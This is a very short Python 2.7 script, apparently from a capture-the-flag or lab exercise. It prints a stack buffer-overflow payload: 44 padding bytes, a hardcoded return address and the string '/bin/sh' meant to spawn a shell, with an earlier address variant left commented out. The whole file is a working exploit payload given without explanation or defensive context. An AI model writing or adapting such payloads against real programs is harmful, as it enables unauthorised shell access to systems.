#!/usr/bin/python2.7
import struct,sys

#sys.stdout.write('A' * 44+ chr(112)+chr(146)+chr(4)+chr(8))

print ('A' * 44+ chr(54)+chr(146)+chr(4)+chr(8)+"/bin/sh\x00")

